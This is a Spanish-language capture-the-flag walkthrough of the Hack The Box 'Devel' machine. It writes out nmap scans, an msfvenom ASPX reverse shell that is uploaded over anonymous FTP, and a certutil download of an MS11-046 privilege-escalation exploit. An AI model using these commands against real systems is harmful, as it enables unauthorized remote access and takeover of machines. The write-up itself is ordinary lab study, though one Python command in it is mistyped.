# HTB Devbel

Hack The Box - Devel
======

## Exploración

Todos los puertos, rapido y silencioso
<pre>
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 192.168.168.193 -oG allPorts
</pre>
 
Puertos especificos
<pre>
nmap -sCV -p135,139,445,1688,3389,49152,49153,49154,49155,49156,49157 192.168.168.193 -oN targeted
</pre>

## Acceso
Tiene IIS.
Usamos msfvenom para crear un exploit
<pre>
msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.54 LPORT=443 -f aspx -o prp.aspx
</pre>

lo subimos por el ftp anonimo y a la escucha con:

<pre>
nc -nlvp 443
</pre>

## Escalada de privilegios

Ordenes interesantes

<pre>
whoami /priv
systeminfo
</pre>

Vemos con system info La versión de windows **6.1.7600 N/A Build 7600**.  
Buscamos por eso en google y vemos que nos indica una vulnerabilidad **MS11-046**.  
Buscamos MS11-046 exploit github y encontramos https://github.com/am0nsec/exploit/blob/master/windows/privs/MS11-046/  
Nos descargamos el archivo ms11-046.exe  

En una consola abrimos un servidor http donde nos hayamos copiado el fichero:
<pre>
python3 -m http-server 80
</pre>

En la windows nos creamos un temporal para almacenar el directorio y en el nos traemos el fichero.  
<pre>
certutil.exe -f -urlcache -split http://10.10.14.54/ms11-046.exe ms11-046.exe
</pre>

Ejecutamos ms11-046.exe y ya escalamos privilegios


